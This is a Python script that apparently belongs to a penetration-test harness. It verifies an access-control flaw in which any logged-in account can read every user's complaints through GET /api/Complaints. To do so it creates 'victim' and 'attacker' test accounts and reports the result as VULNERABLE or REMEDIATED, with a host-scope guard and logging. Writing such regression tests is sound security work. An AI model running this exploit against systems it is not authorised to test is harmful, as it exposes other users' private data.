#!/usr/bin/env python3
"""pt25: GET /api/Complaints returns every account's complaints to anyone logged in.

Found black-box, then corroborated against the vendor's own comment in
server.js: "/* Complaints: POST and GET allowed when logged in only */".
No handler enforces anything beyond that login requirement. Neither
POST nor GET even records which account submitted a complaint
(every complaint created through the API shows UserId: null), so this
isn't just a missing filter, the backend never captured the ownership
data to filter on in the first place.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt25-001.json"


def _request(method: str, url: str, token: str | None = None, body: dict | None = None):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method)
    if body is not None:
        req.add_header("Content-Type", "application/json")
    if token:
        req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            text = resp.read()
            return resp.status, (json.loads(text) if text else {})
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def _register_and_login(target: str, label: str, stamp: str) -> str:
    email = f"pt25-{label}-{stamp}@flatline.test"
    password = "Pt25Pass123!"
    _request("POST", f"{target}/api/Users", body={"email": email, "password": password, "passwordRepeat": password})
    status, body = _request("POST", f"{target}/rest/user/login", body={"email": email, "password": password})
    if status != 200:
        raise RuntimeError(f"login of {email} failed: HTTP {status}")
    return body["authentication"]["token"]


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    stamp = str(int(time.time() * 1000))

    victim_token = _register_and_login(target, "victim", stamp)
    marker = f"pt25 victim-only complaint {stamp}"
    create_status, _ = _request("POST", f"{target}/api/Complaints", token=victim_token, body={"message": marker})

    attacker_token = _register_and_login(target, "attacker", stamp)
    exploit_status, exploit_body = _request("GET", f"{target}/api/Complaints", token=attacker_token)
    attacker_sees_victim = any(c.get("message") == marker for c in exploit_body.get("data", []))

    if not attacker_sees_victim and exploit_status == 200:
        status = "REMEDIATED"
        summary = "The attacker's own list did not include the victim's complaint."
    elif attacker_sees_victim:
        status = "VULNERABLE"
        summary = "An unrelated account's GET to the complaint list included another account's complaint."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, create_status={create_status}."

    legit_status, legit_body = _request("GET", f"{target}/api/Complaints", token=victim_token)
    legitimate_own_complaint_visible = legit_status == 200 and any(c.get("message") == marker for c in legit_body.get("data", []))

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "legitimate_own_complaint_visible": legitimate_own_complaint_visible,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt25-complaint-enumeration", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
